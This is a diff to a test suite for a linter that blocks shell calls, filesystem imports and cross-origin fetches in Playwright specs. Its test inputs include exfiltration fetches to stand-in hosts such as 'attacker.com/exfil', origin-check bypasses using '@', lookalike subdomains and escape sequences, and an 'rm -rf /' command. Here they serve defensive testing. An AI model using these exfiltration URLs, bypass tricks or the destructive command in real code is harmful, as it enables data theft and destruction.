@@ -3,9 +3,10 @@ import assert from 'node:assert/strict'
 import { writeFileSync, mkdtempSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { execSync } from 'node:child_process'
+import { fileURLToPath } from 'node:url'
+import { execFileSync } from 'node:child_process'
 
-const BIN = new URL('../bin/ast-lint.mjs', import.meta.url).pathname
+const BIN = fileURLToPath(new URL('./ast-lint.mjs', import.meta.url))
 
 function lint(content, ext = 'spec.ts', cfg = { allowedOrigins: ['http://localhost:3000'] }) {
   const dir = mkdtempSync(join(tmpdir(), 'astlint-'))
@@ -14,7 +15,7 @@ function lint(content, ext = 'spec.ts', cfg = { allowedOrigins: ['http://localho
   const cfgFile = join(dir, 'cfg.json')
   writeFileSync(cfgFile, JSON.stringify(cfg))
   try {
-    const out = execSync(`node ${BIN} ${file} ${cfgFile}`, { encoding: 'utf8' })
+    const out = execFileSync(process.execPath, [BIN, file, cfgFile], { encoding: 'utf8' })
     return { ok: true, out }
   } catch (e) {
     return { ok: false, out: e.stdout?.toString() || '', err: e.stderr?.toString() || '' }
@@ -54,6 +55,36 @@ test('child_process import banned', () => {
   assert.match(r.out + r.err, /no-shell/)
 })
 
+test('node:child_process imports are banned, aliased or not', () => {
+  for (const src of [
+    `import { exec } from 'node:child_process'\nexec('ls')`,
+    `import { execFile as run } from 'node:child_process'\nrun('ls')`,
+    `import * as cp from "node:child_process"`,
+    `const { spawnSync: go } = require('node:child_process')\ngo('ls')`,
+    'const cp = await import(`node:child_process`)',
+  ]) {
+    const r = lint(src)
+    assert.match(r.out, /no-shell: child_process import/, src)
+  }
+})
+
+test('every child_process execution function is banned as a call', () => {
+  for (const fn of ['exec', 'execFile', 'execSync', 'execFileSync', 'spawn', 'spawnSync', 'fork']) {
+    const r = lint(`await ${fn}('rm -rf /')`)
+    assert.match(r.out, /no-shell: child_process call/, fn)
+  }
+})
+
+test('RegExp .exec( is not a shell call', () => {
+  const r = lint(`import { test, expect } from '@playwright/test'
+test.describe.configure({ mode: 'parallel' })
+test('x', async ({ page }) => {
+  const id = /^BK-(\\d{8})$/.exec(await page.getByRole('heading').innerText())
+  expect(id).not.toBeNull()
+})`)
+  assert.equal(r.ok, true, r.out + r.err)
+})
+
 test('process.env direct read banned', () => {
   const r = lint(`const t = process.env.SECRET_TOKEN`)
   assert.equal(r.ok, false)
@@ -64,6 +95,29 @@ test('cross-origin fetch banned', () => {
   const r = lint(`await fetch('https://attacker.com/exfil')`)
   assert.equal(r.ok, false)
   assert.match(r.out + r.err, /no-cross-origin-fetch/)
+})
+
+test('fetch origins compare parsed origins, never string prefixes', () => {
+  const cfg = { allowedOrigins: ['https://app.example', 'http://localhost:3000/'] }
+  for (const url of [
+    'https://app.example.attacker.test/exfil',
+    'https://app.example@attacker.test/exfil',
+    'http://localhost:30001/exfil',
+    'HTTPS://ATTACKER.TEST/exfil',
+    '//attacker.test/exfil',
+    'http://local host:3000/exfil',
+  ]) {
+    assert.match(lint(`await fetch('${url}')`, 'spec.ts', cfg).out, /no-cross-origin-fetch/, url)
+  }
+  for (const url of ['https://app.example/api/x', 'https://APP.example:443/x', 'http://localhost:3000']) {
+    assert.doesNotMatch(lint(`await fetch('${url}')`, 'spec.ts', cfg).out, /no-cross-origin-fetch/, url)
+  }
+})
+
+test('an allowedOrigins entry that is not an http(s) URL is an invocation error', () => {
+  const r = lint(`await fetch('https://app.example/x')`, 'spec.ts', { allowedOrigins: ['app.example'] })
+  assert.equal(r.ok, false)
+  assert.match(r.err, /allowedOrigins entry is not an http\(s\) URL/)
 })
 
 test('css selector banned', () => {
@@ -87,6 +141,21 @@ test('fs import is banned', () => {
   const r = lint(`import fs from 'node:fs'`)
   assert.equal(r.ok, false)
   assert.match(r.out + r.err, /no-fs/)
+})
+
+test('fs and fs/promises are banned in every load form', () => {
+  for (const src of [
+    `import { readFileSync } from'fs'`,
+    'import { readFile as rf } from `node:fs`',
+    `import 'node:fs'`,
+    `const fs = await import('node:fs')`,
+    `import { writeFile } from 'fs/promises'`,
+    `const { readFile: rf } = require("node:fs/promises")`,
+    `export { rm } from 'node:fs/promises'`,
+  ]) {
+    assert.match(lint(src).out, /no-fs: fs import/, src)
+  }
+  assert.doesNotMatch(lint(`import { createMachine } from 'fsm'`).out, /no-fs/)
 })
 
 test('browser_run_code_unsafe is banned', () => {
@@ -196,4 +265,17 @@ test('x', async ({ page }) => {
   await expect(page.getByText(new RegExp(captured))).toBeVisible()
 })`)
   assert.equal(r.ok, true, r.out + r.err)
+})
+
+test('a fetch URL literal with an escape sequence is refused, never decoded', () => {
+  const cfg = { allowedOrigins: ['https://app.example'] }
+  // Source text as written in a spec: JavaScript turns \@ / \x40 / @ into
+  // "@", so the executed fetch would reach attacker.test.
+  for (const url of [
+    'https://app.example\\@attacker.test/exfil',
+    'https://app.example\\x40attacker.test/exfil',
+    'https://app.example\\u0040attacker.test/exfil',
+  ]) {
+    assert.match(lint(`await fetch('${url}')`, 'spec.ts', cfg).out, /escape sequence/, url)
+  }
 })
